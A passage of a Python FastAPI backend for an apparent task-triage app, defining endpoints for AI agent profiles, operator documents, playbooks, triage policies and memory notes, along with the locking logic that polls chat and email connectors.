            # every brain that can be picked, and the models each offers. A coding picker chooses
            # the BRAIN: the role is the coding profile for every coding task, so offering roles there would
            # be one choice with one entry (the 2026-09-16 spec).
            # the brains a NON-coding hand-off may choose, one per installed CLI (general.py)
            'general_brains': _general.brain_options(store),
            'brain_list': brains_here,
            # ...and whether a coding agent can start at all - the fact terminal.start_on_task refuses on, so the pickers say the same
            'coding_ready': hub_agents.coding_ready(store),
            # every connection keeps its models, installed or not: a task still pinned to a CLI that
            # has since gone has to be able to SAY so, and the picker renders it from this.
            'brain_models': {k: {'choices': _brain_cat(k)['choices'], 'models': _brain_cat(k)['models'],
                                 'installed': k in brains_here,
                                 'default': (cli_connections.gears(cfg, k) or {}).get('model') or ''}
                             for k in (cfg.get('cli_connections') or {})},
            'work': _agent_work(store)}

@app.post('/api/agents/{name}/test')
def agent_test(name: str):
    """One tiny real run through the configured CLI ('Reply with exactly: ok') - proves
    the command exists, flags are right, and headless mode doesn't hang on approvals."""
    a = store.get_agent(name)
    prof = json.loads(a['Config']) if a and a.get('Config') else None
    if not prof: raise HTTPException(404, 'agent not found')
    profile = {**prof, 'timeout': min(int(prof.get('timeout', 120) or 120), 180)}
    try:
        out, sid, _ = hub_agents.run_cli(profile, 'Reply with exactly: ok', lambda *a: None)
        return {'ok': True, 'result': (out or '')[:300], 'resumable': bool(sid)}
    except FileNotFoundError:
        return {'ok': False, 'error': f"command not found: {profile.get('cmd')} - is the CLI installed and on PATH?"}
    except Exception as e:
        return {'ok': False, 'error': str(e)[:400]}

@app.put('/api/agents/{name}')
def put_agent(name: str, body: dict):
    if not re.fullmatch(r'[a-z0-9][a-z0-9_-]*', name):
        raise HTTPException(422, 'Use a lowercase profile name with letters, numbers, hyphens or underscores')
    row = store.get_agent(name) or {}
    candidate = copy.deepcopy(cfg)
    try:
        profile = cli_connections.set_profile(candidate, store, name, body)
        cli_connections.resolve(candidate, profile, cli_connections.brain_of(store, candidate, name, profile))
    except ValueError as e: raise HTTPException(422, str(e))           # a CLI the body NAMES that is not connected is still refused
    # A PROFILE IS A NAME AND INSTRUCTIONS (the owner, 2026-10-22): it saves with no CLI behind it - the brain is the AI defaults'
    # answer, asked when work starts. "Choose a configured CLI provider" refused every profile on a box with none connected
    profile['kind'] = profile.get('kind') or hub_agents.DEFAULT_PROFILES.get(name, {}).get('kind') or row.get('Kind') or 'coding'
    profile['purpose'] = hub_agents.profile_purpose(name, profile, profile['kind'])
    if profile.get('triage_enabled', True) and not profile['purpose']:
        raise HTTPException(422, 'Describe when triage should choose this profile, or turn off automatic triage routing')
    if profile.get('rules_doc') and not re.fullmatch(r'[a-z0-9][a-z0-9_-]*', str(profile['rules_doc'])):
        raise HTTPException(422, 'Invalid rules document name')
    rules_doc = profile.get('rules_doc')
    if rules_doc and rules_doc != name and not store.get_doc(rules_doc) and not hub_agents.profile_template(store, rules_doc):
        raise HTTPException(422, 'Choose an existing instructions document or this profile\'s own document')
    cfg['agents'] = candidate['agents']
    cfg['cli_connections'] = candidate.get('cli_connections', {})
    config.save(cfg)
    cli_connections.sync(cfg, store, name)
    rules_doc = hub_agents.ensure_profile_document(store, name)
    store.audit('agent', 0, 'save', ACTOR, detail=name)
    return {'ok': True, 'rules_doc': rules_doc, 'triage_available': profile.get('triage_enabled', True) is not False and bool(profile['purpose'])}

@app.get('/api/roles')
def roles_list():
    """The roles one click sets Taskuary up for (roles.py): a worker, its playbooks, where mail goes."""
    from . import roles
    return {'data': roles.catalog(store)}

class RoleBody(BaseModel):
    portal: str = ''
    route_mail: bool = True

@app.post('/api/roles/{name}')
def roles_apply(name: str, body: RoleBody):
    from . import roles
    try: return roles.apply(store, cfg, name, body.portal, body.route_mail)
    except ValueError as e: raise HTTPException(422, str(e))

@app.delete('/api/agents/{name}')
def delete_agent(name: str):
    if name not in cfg.get('agents', {}): raise HTTPException(404, 'agent not found')
    # An IMPORTED profile's document goes with it: the import wrote it, nothing else shares it, and
    # left behind it would be the body a later profile of the same name silently inherits. A document
    # anyone else wrote (the owner, a template) stays - deleting a worker is not deleting its rules.
    # ...and all of it is kept under Recently deleted, so Undo and Restore bring the profile back whole (recentlydeleted.py)
    from . import recentlydeleted
    out = recentlydeleted.remove_profile(store, cfg, name)
    store.audit('agent', 0, 'delete', ACTOR, detail=name)
    return {'ok': True, **out}

def _template_text(name: str) -> str:
    return hub_agents.profile_template(store, name)

def _heal_blank_doc(name: str) -> str:
    """An EMPTY operator document is never what anyone meant: it switches off the rules every prompt
    is stacked on (CODING.md blank = a coding agent with no rules) and it says nothing an owner wrote. The
    templates have always said "blank the document entirely and the shipped default is used again",
    so that is what happens - here, the moment it is read, not at the next restart."""
    cur = store.get_doc(name)
    if not str(cur or '').strip():
        t = _template_text(name)
        if t.strip():
            store.save_doc(name, t, 'template'); store.audit('doc', 0, 'restored_blank', 'system', detail={'doc': name})
            logger.warning(f'{name}.md was empty - the shipped default is back in place')
            return t
    return cur or ''

@app.get('/api/how-it-works')
def how_it_works():
    """The reference page in Settings → Docs: the Assistant, and the gates a message passes in order.
    Shipped with the app (templates/how-it-works.md) and read-only - it describes what the code does,
    so it is not an operator document to edit and never becomes a `doc` row."""
    from pathlib import Path
    f = Path(__file__).parent / 'templates' / 'how-it-works.md'
    if not f.exists(): raise HTTPException(404, 'the reference page is missing from this build')
    return {'text': f.read_text(encoding='utf-8')}

@app.get('/api/doc/{name}')
def get_doc(name: str):
    """Raw for the editor, rendered so you can see what an agent will actually read."""
    name = hub_agents.profile_document(store, name)
    content = _heal_blank_doc(name)
    return {'name': name, 'content': content, 'rendered': store.doc(name) or '',
            'owner': store.owner()}

@app.put('/api/doc/{name}')
def put_doc(name: str, body: DocBody):
    name = hub_agents.profile_document(store, name)
    # blank = "give me the shipped default back", as the templates' own comments promise
    if not str(body.content or '').strip() and _template_text(name).strip():
        store.save_doc(name, _template_text(name), 'template')
        return {'ok': True, 'restored': True}
    from . import counsel as _counsel
    if name == 'counsel': _counsel.check_budget(store, name, body.content)
    store.save_doc(name, body.content, ACTOR)
    return {'ok': True}

# ── playbooks: the fourth operator document, one file per kind of job (playbooks.py) ──────
# Read by the Reports page's Playbooks shelf and by every connector card (filtered by `uses`). Agents
# may GET these; writing is the owner's (guard.py denies agent tokens) - an agent PROPOSES one.
@app.get('/api/playbooks')
def list_playbooks():
    return {'data': [{k: v for k, v in b.items() if k != 'text'} for b in playbooks.list_all()],
            'deleted': playbooks.recently_deleted(), 'keep_days': playbooks.KEEP_DAYS,
            'template': playbooks.template(), 'folder': str(playbooks.folder())}

@app.get('/api/playbooks/examples')
def playbook_examples(q: str = '', before: int = 0):
    return store.playbook_examples(q[:300], max(0, before))


class PlaybookSetupBody(BaseModel):
    text: str = ''
    message_id: int | None = None
    connector_type: str = ''


def _playbook_opens(task_id: int):
    from . import general
    try:
        general.start_session(store, task_id, actor=ACTOR).send_prompt(
            playbooks.SETUP_OPENING, as_owner=False, echo=False)
    except Exception as e:
        general.drop_session(task_id)
        _walk_cannot(task_id, f'Playbook setup could not start: {e}. You can retry in this conversation.')
    finally:
        general.OPENING.discard(task_id)


@app.post('/api/playbooks/setup')
def setup_playbook(body: PlaybookSetupBody, background: BackgroundTasks):
    from . import general
    if not general.provider_options(store):
        raise HTTPException(422, f"Connect an AI under {words.name('ai')} first, then return to create your playbook.")
    try:
        made = playbooks.setup_task(store, body.text, body.message_id, body.connector_type, ACTOR)
    except ValueError as e:
        raise HTTPException(422, str(e))
    general.OPENING.add(made['taskId'])
    background.add_task(_playbook_opens, made['taskId'])
    return made


@app.get('/api/playbooks/{slug}')
def get_playbook(slug: str):
    text = playbooks.read(slug)
    if text is None: raise HTTPException(404, f'no playbook {slug!r}')
    pb = playbooks.parse(text)
    return {'slug': playbooks.slugify(slug), 'content': text, 'title': pb['title'], 'uses': playbooks.uses_of(pb)}

@app.put('/api/playbooks/{slug}')
def put_playbook(slug: str, body: DocBody):
    """'new' as the slug files it under its title."""
    try: out = playbooks.write(slug, body.content)
    except ValueError as e: raise HTTPException(400, str(e))
    store.audit('playbook', 0, 'saved', ACTOR, detail={'slug': out})
    return {'ok': True, 'slug': out}

class PlaybookOnBody(BaseModel): on: bool

@app.put('/api/playbooks/{slug}/enabled')
def playbook_on(slug: str, body: PlaybookOnBody):
    """Switch one playbook off, kept for later - triage stops offering it - or back on."""
    if playbooks.read(slug) is None: raise HTTPException(404, f'no playbook {slug!r}')
    playbooks.set_on(slug, body.on)
    store.audit('playbook', 0, 'switched_on' if body.on else 'switched_off', ACTOR, detail={'slug': playbooks.slugify(slug)})
    return {'ok': True, 'slug': playbooks.slugify(slug), 'enabled': body.on}

@app.delete('/api/playbooks/{slug}')
def delete_playbook(slug: str):
    if not playbooks.delete(slug): raise HTTPException(404, f'no playbook {slug!r}')
    store.audit('playbook', 0, 'deleted', ACTOR, detail={'slug': playbooks.slugify(slug)})
    return {'ok': True}

@app.post('/api/playbooks/{slug}/restore')
def restore_playbook(slug: str):
    """Recently deleted -> back on the shelf as it was: its words, its on/off switch, its place in the order."""
    if not playbooks.restore(slug): raise HTTPException(404, f'no deleted playbook {slug!r}')
    store.audit('playbook', 0, 'restored', ACTOR, detail={'slug': playbooks.slugify(slug)})
    return {'ok': True, 'slug': playbooks.slugify(slug)}

@app.get('/api/learned/graph')
def learned_graph():
    """LEARNED.md as a picture: lines, the verdicts that fed them, each line's score over time,
    the lines that died - the Docs section's Visualize view (discussion #27)."""
    return learnedgraph.graph(store)

@app.get('/api/since')
def since_summary():
    """The opening screen's two lines: what happened since last night, and what was learned this week (since.py - no model)."""
    from . import since
    return since.summary(store)

@app.get('/api/learned/changes')
def learned_changes(days: int = 30):
    """LEARNED.md's history as a list - what it learned, merged and let fade - the Docs section's What changed view."""
    return {'data': learnedgraph.changes(store, max(1, min(days, 365)))}

class AdoptBody(BaseModel): key: str

class MarkBody(BaseModel):
    key: str
    how: str

@app.post('/api/learned/mark')
def learned_mark(body: MarkBody):
    """Keep, Wrong or Forget one line of LEARNED.md (the owner's ruling 2, 2026-10-23) - from What changed or Visualize. No AI needed.
    409 with the reason in words when the line cannot take it (Wrong on a line the owner wrote); 404 when it changed under the page."""
    from . import memoryedit
    try: return memoryedit.mark(store, body.key, body.how)
    except LookupError as e: raise HTTPException(404, str(e).strip("'\""))
    except ValueError as e: raise HTTPException(409, str(e))

@app.post('/api/learn/adopt')
def learn_adopt(body: AdoptBody):
    try: return learn.adopt(store, body.key, ACTOR)
    except ValueError as e: raise HTTPException(404, str(e))

@app.get('/api/doc/generate/status')
def doc_generate_status():
    """Live progress + receipts for a running (or the last) generate-from-history: what is
    being read right now, and afterwards the exact evidence handed to the model."""
    from .histgen import STATUS
    return STATUS

# ── SOUL.md from a short interview (interview.py) ────────────────────────────────────────
class InterviewBody(BaseModel):
    answers: list[dict] | dict = {}

@app.get('/api/soul/interview')
def soul_questions():
    """Interview context only; the assistant generates one question at a time."""
    from . import interview
    return {'total': interview.TOTAL_QUESTIONS, 'context': interview.context(store),
            'current': (store.get_doc('soul') or '')[:400], 'owner': store.owner()}

@app.post('/api/soul/interview/next')
def soul_next_question(body: InterviewBody):
    """Use the answers so far to ask one relevant next question, never a fixed form."""
    from . import interview
    try: return {'question': interview.next_question(store, body.answers or [])}
    except ValueError as e: raise HTTPException(422, str(e))

@app.post('/api/soul/interview')
def soul_write(body: InterviewBody):
    """The seven-turn transcript in, SOUL.md out - saved and still theirs to edit."""
    from . import interview
    try: return {'doc': interview.write(store, body.answers or {}, ACTOR)}
    except ValueError as e: raise HTTPException(422, str(e))

@app.post('/api/doc/{name}/generate')
def doc_generate(name: str, days: int = 90):
    """The Docs section's 'Generate from history': read the last N days of the mailbox itself
    (sent + inbox over Graph; Taskuary's own record when no Graph mailbox is connected),
    distill it, and fill the doc's marked block. Slow by nature - one or two Graph sweeps
    plus an AI pass - the button shows it working."""
    from . import histgen
    try:
        detail = histgen.generate(store, name, days)
    except Exception as e:
        raise HTTPException(400, str(e)[:400])
    store.audit('doc', 0, 'generate_from_history', ACTOR, detail={'doc': name, 'source': detail})
    return {'ok': True, 'detail': detail}

@app.post('/api/learn/reflect')
def learn_reflect():
    """Consolidate LEARNED.md now instead of waiting for the threshold - the Docs page's
    'Reflect now'. False means there was no AI brain or nothing usable came back; the doc
    is never replaced with a worse one."""
    ok = learn.reflect(store)
    if ok: store.audit('doc', 0, 'reflect', ACTOR)
    return {'ok': True, 'reflected': ok}

class OwnerBody(BaseModel): name: str; email: str | None = None

@app.get('/api/owner')
def get_owner(): return {**store.owner(), 'tokens': list(store_mod.DOC_TOKENS)}

# ── About you (taskuary/whoami.py): what the system knows about its owner, in one place ──
@app.get('/api/whoami')
def whoami():
    from . import whoami as _w
    return _w.profile(store)

@app.patch('/api/whoami')
def whoami_save(body: dict):
    """The manual facts (phone, handles, title, bio, avatar choice) - plain whitelisted settings.
    Name and email keep going through PUT /api/owner, which retokens the docs."""
    from . import whoami as _w
    try: out = _w.save(store, body or {}, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))
    store.audit('setting', 0, 'profile', ACTOR, detail={'fields': sorted((body or {}).keys())})
    return out

@app.get('/api/whoami/avatar')
def whoami_avatar(style: str = 'monogram', seed: str = '', name: str = ''):
    """A preview: the same deterministic SVG the profile shows, for a style and seed not saved yet."""
    from . import whoami as _w
    if style not in _w.STYLES: raise HTTPException(422, f'style must be one of {", ".join(_w.STYLES)}')
    nm = name or (store.owner().get('owner') if store.owner().get('owner') != 'the owner' else '')
    return {'svg': _w.avatar_svg(nm, seed or nm or 'taskuary', style), 'style': style, 'seed': seed or nm or 'taskuary'}

@app.put('/api/owner')
def put_owner(body: OwnerBody):
    """Your name, in ONE place. SOUL.md and CODING.md refer to the owner nine times between them,
    so typing it in changed one of them and left a document that half called you by name and half
    called you John Smith. Saving here rewrites every literal occurrence of the OLD name into a
    {{owner}} token, so the documents convert themselves once and never drift again."""
    new = (body.name or '').strip()
    if not new: raise HTTPException(422, 'a name is required')
    return store_mod.set_owner(store, new, body.email, ACTOR)


@app.get('/api/policies')
def policies(): return {'data': store.list_policies(active_only=False)}

@app.post('/api/policies')
def save_policy(body: PolicyBody):
    fields = {k: (int(v) if k == 'Active' else v) for k, v in body.model_dump().items() if v is not None}
    if not fields.get('PolicyId') and not all(fields.get(k) for k in ('Name', 'Kind', 'Action', 'Reason')):
        raise HTTPException(422, 'new policies need Name, Kind, Action, Reason')
    # an action the engine does not know matches nothing, so a rule saved with one looks set and never fires
    if body.Action is not None and body.Action not in policy_engine.PRECEDENCE:
        raise HTTPException(422, 'A rule can skip, ignore or escalate a message - pick one of those three.')
    if body.Kind is not None and body.Kind not in policy_engine.KINDS:
        raise HTTPException(422, 'A rule matches on a keyword, a sender, a domain, an automated address or a first-time sender - pick one of those.')
    # a skip rule also reaches BACKWARDS: the sender's existing rows leave the timeline (policy.save)
    return policy_engine.save(store, fields, ACTOR)

@app.delete('/api/policies/{pid}')
def delete_policy(pid: int):
    """Gone, not just off. The rules "Not a task" writes by itself pile up, and a wrong one
    could only ever be switched off - the list kept every mistake. A skip rule's hidden history
    comes back first, exactly as switching it off would have done."""
    p = next((x for x in store.list_policies(active_only=False) if x['PolicyId'] == pid), None)
    if not p: raise HTTPException(404, 'policy not found')
    from . import recentlydeleted
    out = recentlydeleted.remove_policy(store, pid)            # kept under Recently deleted: Restore hides that history again
    store.audit('policy', pid, 'delete', ACTOR, detail={'name': p.get('Name'), 'restored': out['restored']})
    return {'ok': True, **out}

@app.get('/api/memory')
def memory(): return {'data': store.list_memories(active_only=False)}

@app.post('/api/memory')
def add_memory(body: MemoryBody):
    # 'subject' was missing here, so a topic rule - which is what most verdicts actually are -
    # could only be written by pressing "Not our task" on a message, never typed in by hand
    if body.scope not in ('global', 'sender', 'sender_domain', 'source', 'subject'):
        raise HTTPException(422, 'bad scope')
    # a keyed scope with no key matches nothing, ever: saved, listed, and silent
    if body.scope != 'global' and not (body.scope_key or '').strip():
        raise HTTPException(422, f'a {body.scope} note needs a scope_key to match on')
    if not body.note.strip(): raise HTTPException(422, 'note is required')
    source = body.source if body.source in ('manual', 'writing') else 'manual'
    mid = store.add_memory({'Scope': body.scope, 'ScopeKey': body.scope_key, 'Note': body.note.strip()[:1000],
                            'Source': source, 'Active': 1, 'CreatedBy': ACTOR})
    store.audit('memory', mid, 'create', ACTOR)
    return {'ok': True, 'memoryId': mid}

@app.patch('/api/memory/{mid}')
def toggle_memory(mid: int, body: MemoryToggle):
    store.set_memory_active(mid, body.active)
    store.audit('memory', mid, 'activate' if body.active else 'deactivate', ACTOR)
    # A NOTE SWITCHED OFF WITHDRAWS WHAT IT FED (phase C, 2026-10-23): a rule it carried into LEARNED.md stopped being the owner's word
    if not body.active: learn.withdraw(store, mid)
    learn.note_verdicts(store)
    return {'ok': True}

@app.get('/api/audit/recent')
def audit_recent(limit: int = 100): return {'data': store.list_audit(limit=max(1, min(limit, 500)))}

# Two lanes. The FULL lane reads every connector, judges the queue, watches CI and runs reports,
# one at a time in this process (the DB flag is only for the UI). The CHAT lane reads chat
# connectors on their own fast clock and has their lines judged ahead of the backlog - it used to
# share the full lane's lock, so an AI triage over a 3-day catch-up or a slow report kept Teams
# and WhatsApp from arriving for as long as it ran (PW-001). A connector type is read by ONE lane
# at a time, so dedupe never races two fetches of the same message.
_POLL_BUSY = threading.Lock()
_QUICK_LOCKS, _QUICK_GUARD = {}, threading.Lock()     # one lock per chat type: a hung WhatsApp fetch keeps only its own
def _quick_lock(typ: str) -> threading.Lock:
    with _QUICK_GUARD: return _QUICK_LOCKS.setdefault(typ, threading.Lock())
def _quick_busy() -> bool: return any(l.locked() for l in list(_QUICK_LOCKS.values()))
_LAST_POLL = [time.time()]      # startup's own catch-up counts as the first one
_HEARTBEAT = [0.0]              # ...and when we last wrote down that the app is still up
HEARTBEAT_TICK = 300
POLL_TICK = 30                  # how often the full loop wakes to look at the clock
QUICK_TICK = 5                  # the chat loop looks more often, so "every 30 seconds" means that
SLOW_CHAT_READ = 3.0            # a chat read past this is logged with its length: it is a late phone answer


def chat_read_line(types, added, took: float) -> str:
    """The log line for one chat poll, or ''. Only SLOW reads were logged, so "read 0 line(s)" was all the log ever said about
    WhatsApp and read as "nothing ever arrives" (2026-10-23). Every read that brought lines says so; a slow empty one says it was
    slow and that nothing was new; a quick empty one - the doorway's once-a-second read - says nothing."""
    what, n = ', '.join(types), int(added or 0)
    if n:
        from .timewords import plural
        return f"chat poll {what} read {plural(n, 'line')} in {took:.1f}s"
    return f"chat poll {what} slow ({took:.1f}s), nothing new" if took > SLOW_CHAT_READ else ''
DRAIN_WAIT = 45                 # the context gate's patience for its lines to be judged (the old lock wait)
CHAT_CONNECTORS = {'teams', 'slack', 'telegram', 'whatsapp', 'imessage', 'discord'}
CHAT_POLL_SECONDS = 30
CONTEXT_FRESH_SECONDS = 60
_FETCHING = {}                  # connector type -> lane reading it right now
_FETCH_CV = threading.Condition()
_STATUS_LOCK = threading.Lock()
_STATUS_OWNERS = {}             # store id -> {token: {lane, what, at, store}}
_STATUS_SEQ = [0]
_DRAIN_WORKERS = {}             # store id -> DrainWorker which captured that exact store
_DRAIN_WORKERS_LOCK = threading.Lock()
_DRAIN_CLOSED = weakref.WeakSet()  # stores shutting down reject a late poll's drain submission


@contextlib.contextmanager
def _claim_fetch(types, lane, wait=False, timeout=None):
    """Atomically reserve the connector types this lane may fetch.

    The old check-then-register pair let two lanes both observe a free connector.  A unique owner
    token also prevents one lane's cleanup from releasing a newer claim after an exception race.
    A waiting correctness gate requires its complete requested set; background lanes take the
    currently available subset and retry skipped connectors on their next clock tick.
    """
    requested = list(dict.fromkeys(types))
    owner = object()
    with _FETCH_CV:
        if wait:
            ready = _FETCH_CV.wait_for(lambda: not any(t in _FETCHING for t in requested),
                                       timeout=timeout if timeout is not None else DRAIN_WAIT)
            claimed = requested if ready else []
        else:
            claimed = [t for t in requested if t not in _FETCHING]
        for t in claimed: _FETCHING[t] = (lane, owner)
    try:
        yield claimed
    finally:
        with _FETCH_CV:
            for t in claimed:
                if _FETCHING.get(t) == (lane, owner): _FETCHING.pop(t, None)
            _FETCH_CV.notify_all()


def _visible_status(owners):
    if not owners: return {'state': 'idle'}
    full = [x for x in owners.values() if x['lane'] == 'full']
    chosen = max(full or list(owners.values()), key=lambda x: x['seq'])
    return {'state': 'running', 'what': chosen['what'], 'at': chosen['at'],
            'phase': chosen['phase'], 'lane': chosen['lane']}


def _status_write(target_store, owners):
    # the same banner again is no news: each write is a transaction AND an ingest-status push to every
    # open page, and an idle phone doorway was sending the identical "idle" two or three times a second (P13)
    st = json.dumps(_visible_status(owners))
    if target_store.get_setting('ingest_status') != st: target_store.set_setting('ingest_status', st, 'system')


def _status_begin(target_store, lane, what):
    token = object()
    with _STATUS_LOCK:
        _STATUS_SEQ[0] += 1
        owners = _STATUS_OWNERS.setdefault(id(target_store), {})
        owners[token] = {'store': target_store, 'lane': lane, 'what': what, 'phase': 'fetching',
                         'at': datetime.now().isoformat(sep=' ', timespec='seconds'),
                         'seq': _STATUS_SEQ[0]}
        _status_write(target_store, owners)
    return token


def _status_progress(target_store, token, what, *, phase=None):
    with _STATUS_LOCK:
        owners = _STATUS_OWNERS.get(id(target_store), {})
        if token not in owners: return
        owners[token]['what'] = what
        if phase is not None: owners[token]['phase'] = phase
        owners[token]['at'] = datetime.now().isoformat(sep=' ', timespec='seconds')
        _status_write(target_store, owners)


def _status_end(target_store, token):
    with _STATUS_LOCK:
        owners = _STATUS_OWNERS.get(id(target_store), {})
        owners.pop(token, None)
        _status_write(target_store, owners)
        if not owners: _STATUS_OWNERS.pop(id(target_store), None)


def _drain_worker(target_store):
    from . import ingest as ingest_mod
    key = id(target_store)
    with _DRAIN_WORKERS_LOCK:
        if target_store in _DRAIN_CLOSED:
            raise RuntimeError('triage drain is closed for this store')
        worker = _DRAIN_WORKERS.get(key)
        if worker is None:
            worker = ingest_mod.DrainWorker(target_store, lambda: _llm(target_store))
            _DRAIN_WORKERS[key] = worker
        return worker


def join_drains(target_store=None, timeout=None) -> bool:
    """Wait for the exact store's queued triage; used by shutdown and isolated fixtures."""
    target = target_store or store
    with _DRAIN_WORKERS_LOCK: worker = _DRAIN_WORKERS.get(id(target))
    return True if worker is None else worker.join(timeout)


def _open_drain_workers(target_store=None) -> bool:
    """Admit drains for a new lifecycle only after an older worker has fully stopped."""
    target = target_store or store
    key = id(target)
    with _DRAIN_WORKERS_LOCK:
        worker = _DRAIN_WORKERS.get(key)
        if worker and worker.active: return False
        if worker: _DRAIN_WORKERS.pop(key, None)
        _DRAIN_CLOSED.discard(target)
    return True


def _close_drain_workers(timeout=None, target_store=None) -> bool:
    with _DRAIN_WORKERS_LOCK:
        # closing everything closes the app's own store too, worker or not: left open, a drain a finished request
        # queued a moment later starts a new worker on it after the close (a macOS CI flake, 2026-10-18)
        targets = [target_store] if target_store is not None else [*{id(o): o for o in [store, *(w.store for w in _DRAIN_WORKERS.values())] if o is not None}.values()]
        keys = [id(target) for target in targets]
        _DRAIN_CLOSED.update(targets)
        workers = [(key, _DRAIN_WORKERS.get(key)) for key in keys if _DRAIN_WORKERS.get(key)]
    end = None if timeout is None else time.monotonic() + timeout
    ok = True
    for key, worker in workers:
        left = None if end is None else max(0, end - time.monotonic())
        stopped = worker.close(left)
        if stopped:
            with _DRAIN_WORKERS_LOCK:
                if _DRAIN_WORKERS.get(key) is worker: _DRAIN_WORKERS.pop(key, None)
        ok = stopped and ok
    return ok


def _ingest_status(what: str = None):
    st = {'state': 'running', 'what': what, 'at': datetime.now().isoformat(sep=' ', timespec='seconds')} if what else {'state': 'idle'}
    store.set_setting('ingest_status', json.dumps(st), 'system')


def _latest_context_message(task_id: int = None, message_id: int = None):
    """Newest inbound line in exactly the context an action is about."""
    if task_id:
        return store.last_inbound_on_task(task_id)
    m = store.get_message(message_id) if message_id else None
    if not m: return None
    cid = m.get('ConversationId')
    return store.last_inbound_in(cid) if cid else m


def _refresh_for_finish(_store, task_id: int, message_id: int) -> dict:
    """wrapup.finish's refresh (PW-235): the conversation is read from its provider before the result becomes a reply."""
    if _store is not store:
        raise RuntimeError('completion refresh belongs to a different store')
    return _refresh_chat_context(task_id=task_id, message_id=message_id)


def _refresh_chat_context(task_id: int = None, message_id: int = None, grace: bool = False, on_fetched=None) -> dict:
    """Synchronize a live chat before its stored text is used to answer or act.

    The background clock keeps the screen lively; this is the correctness gate.  If an Assistant
    answer, draft, approval, or agent launch is about a chat, its provider is read first and the
    newly ingested lines are attached/triaged before the context is built.
    """
    before = _latest_context_message(task_id, message_id)
    channel = str((before or {}).get('Channel') or '').lower()
    # email is refreshed too (PW-049): through the connector behind the mailbox the message arrived in,
    # incrementally - the poll is a watermark read, and the chain is completed by chains.py, never re-downloaded
    if channel == 'email':
        mailbox = str((before or {}).get('SourceName') or '').lower()
        src = next((x for x in store.list_sources(active_only=False) if x.get('Channel') == 'email' and str(x.get('Address') or '').lower() == mailbox), None)
        conn = store.get_connector(src['ConnectorId']) if src and src.get('ConnectorId') else None
        types = [str(conn.get('Type') or '').lower()] if conn and conn.get('Active') else []
    elif channel in CHAT_CONNECTORS: types = [channel]
    else: return {'polled': False, 'newer': False, 'before': before, 'after': before, 'added': 0}
    connectors = [c for c in store.list_connectors()
                  if c.get('Active') and str(c.get('Type') or '').lower() in types]
    if not types or not connectors:
        return {'polled': False, 'newer': False, 'before': before, 'after': before, 'added': 0, 'channel': channel}
    # `grace`: the chat INTRODUCING an item may lean on a fetch from the last minute - a walk through ten
    # items was ten provider round trips (2026-09-06). An action on it (a reply, an approval, an agent
    # launch) always reads the provider first: that is the correctness gate this function exists for.
    if grace and _recently_fetched(types, store):
        return {'polled': False, 'newer': False, 'before': before, 'after': before,
                'added': 0, 'channel': channel, 'fresh': True}
    added = _poll_reports(0, what=f'refreshing {channel} context', only=types, wait=True, on_fetched=on_fetched)
    if added is False:
        raise RuntimeError('messages are still syncing; I did not use stale chat context - try again in a moment')
    failed = [store.get_connector(c['ConnectorId']) for c in connectors]
    failed = [c for c in failed if c and c.get('LastError')]
    if failed:
        raise RuntimeError(f"I could not refresh {channel}, so I did not use stale chat context: {failed[0]['LastError']}")
    after = _latest_context_message(task_id, message_id)
    newer = bool(after and (not before or after.get('MessageId') != before.get('MessageId')))
    if newer:
        from . import funnel
        funnel.invalidate()
    return {'polled': True, 'newer': newer, 'before': before, 'after': after,
            'added': int(added or 0), 'channel': channel}


from . import wrapup as _wrapup
_wrapup.REFRESH = _refresh_for_finish
# ...and the chat's own repair of a connection that stopped (troubleshoot.repair): one type through the chat lane, waited on
from . import troubleshoot as _troubleshoot
_troubleshoot.SYNC = lambda typ: _poll_reports(0, what=f'syncing {typ}', only=[typ], wait=True)


_NOTICED = {}      # funnel key -> the message-set revision the owner was last told about (PW-052: once per revision)
# said the moment new lines land on the item under discussion, before their triage result (PW-052/057)
RETRIAGE_STARTED = "New messages came in on this conversation. I'm sending it through triage again before we continue."


def _refresh_items(items: list, on_fetched=None) -> dict:
    """Refresh the sources behind these items - once per channel, not once per item (an FYI batch of
    four Teams lines is one Teams read). Returns the merged freshness."""
    out, done = {'polled': False, 'newer': False, 'added': 0}, set()
    for it in items:
        m = store.get_message(it.get('mid')) if it.get('mid') else None
        ch = str((m or {}).get('Channel') or it.get('channel') or '').lower()
        if not ch or ch in done: continue
        done.add(ch)
        f = _refresh_chat_context(it.get('tid'), it.get('mid'), grace=True, on_fetched=on_fetched)
        out['polled'] = out['polled'] or bool(f.get('polled')); out['newer'] = out['newer'] or bool(f.get('newer'))
        out['added'] += int(f.get('added') or 0)
    return out


_AFTER = collections.deque(maxlen=8)      # the change-checks in flight, so a test (or a shutdown) can wait for them


def _refresh_after(out: dict):
    """The change-check FOLLOWS the four (design C, 2026-09-17). Next used to ask the provider about the
    item it was about to show BEFORE answering - a network wait of 100-1,000 ms inside every press, and a
    re-pick when the thread had moved. Now the answer goes out from the rail, and the provider is asked
    afterwards, here, on a thread: every channel of an FYI batch once (_refresh_items). Mail that arrives
    writes through ingest, the rail's dirty rows and the live event carry it to the page, whose reload
    refreshes the card in place and says so on the strip (funnelPile.currentItemFromPile). The item on
    the table is NOT re-picked. A clicked row is checked here too, since 2026-10-01: it opens at once."""
    item = (out or {}).get('item') or {}
    members = item.get('items') if item.get('kind') == 'fyis' else [item]
    members = [m for m in (members or []) if isinstance(m, dict) and (m.get('mid') or m.get('tid'))]
    if not members: return None
    def work():
        try: _refresh_items(members)
        except Exception as e: logger.debug(f'the change-check after the four could not ask the provider: {e}')
    # started BEFORE it is recorded: a waiter that found it in _AFTER first joined a thread not yet started, which raises
    t = threading.Thread(target=work, daemon=True, name='refresh-after'); t.start(); _AFTER.append(t)
    return t


def wait_refresh_after(timeout: float = 5.0):
    """Wait for the change-checks in flight (tests; nothing in the request path waits on them)."""
    for t in list(_AFTER): t.join(timeout)


def _notice_once(freshness: dict) -> str | None:
    """The context-update line, once per new revision of the item (PW-052/057): a poll or a re-render
    that finds nothing new says nothing; the same new line is never announced twice."""
    item = (freshness or {}).get('item') or {}
    if not freshness or not freshness.get('newer') or not item.get('key'): return None
    after = freshness.get('after') or {}
    rev = f"{after.get('MessageId')}:{(store.get_review(item['rid']) or {}).get('Status') if item.get('rid') else ''}"
    if _NOTICED.get(item['key']) == rev: return None
    _NOTICED[item['key']] = rev
    while len(_NOTICED) > 500: _NOTICED.pop(next(iter(_NOTICED)))
    return _context_update_line(freshness)


def _refresh_chat_key(key: str = None, seen_mid: int = None, on_fetched=None) -> dict:
    """Refresh the item held by the Assistant and compare it with what the browser saw."""
    if not key: return {}
    from . import funnel
    item = funnel.next_item(store, key) or funnel.item_for_key(store, key)
    if not item: return {}
